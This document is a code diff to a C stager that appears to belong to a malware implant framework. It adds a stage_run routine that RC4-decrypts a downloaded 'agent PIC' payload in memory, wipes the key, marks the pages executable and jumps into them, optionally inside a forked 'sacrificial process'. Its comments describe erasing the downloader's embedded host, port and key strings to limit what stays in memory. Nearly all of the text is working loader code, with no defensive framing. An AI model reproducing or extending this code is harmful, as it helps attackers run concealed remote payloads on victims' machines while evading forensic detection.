@@ -1,5 +1,6 @@
 #define _GNU_SOURCE
 #include "downloader_blob.h"
+#include "rc4.h"
 #include "stage_abi.h"
 #include "state.h"
 #include "syscalls.h"
@@ -13,11 +14,33 @@
  * lifecycle. It runs the downloader from a separate mapping so that, as soon
  * as the agent PIC has been fetched, the downloader can be zeroed and unmapped
  * together with its code, transport tables and the embedded host/port/key
- * strings. Only the supervisor and the agent PIC remain in memory.
+ * strings. Only the supervisor, the encrypted agent PIC and its key remain in
+ * memory.
  */
 
 typedef void (*downloader_fn)(struct download_result *);
 typedef void (*stage1_entry)(void *base_addr, size_t total_size);
+
+/*
+ * Decrypt the downloaded ciphertext in place, flip it to RX, and enter the
+ * payload. In supervision mode this runs in the forked child, so copy-on-write
+ * confines the plaintext and the RX transition to the sacrificial process; the
+ * parent's mapping stays ciphertext RW.
+ */
+static void stage_run(void *arg) {
+  struct download_result *res = (struct download_result *)arg;
+
+  rc4_ctx rc4;
+  rc4_init(&rc4, res->key, sizeof(res->key));
+  memset(res->key, 0, sizeof(res->key));
+  rc4_crypt(&rc4, (uint8_t *)res->data, res->size);
+
+  if (mprotect(res->data, PAGE_ALIGN_UP(res->size),
+               PROT_READ | PROT_EXEC) != 0)
+    exit(1);
+
+  ((stage1_entry)res->data)(res->data, res->size);
+}
 
 static void stub_main(void) __attribute__((used));
 static void stub_main(void) {
@@ -60,12 +83,11 @@ static void stub_main(void) {
   if (res.data == NULL || res.size == 0)
     exit(1);
 
-  stage1_entry entry = (stage1_entry)res.data;
 #if SUPERVISE
   debug_print("Stage0: supervising Stage1 in a sacrificial process\n");
-  supervise_run(entry, res.data, res.size);
+  supervise_run(stage_run, &res);
 #else
-  entry(res.data, res.size);
+  stage_run(&res);
 #endif
   exit(0);
 }
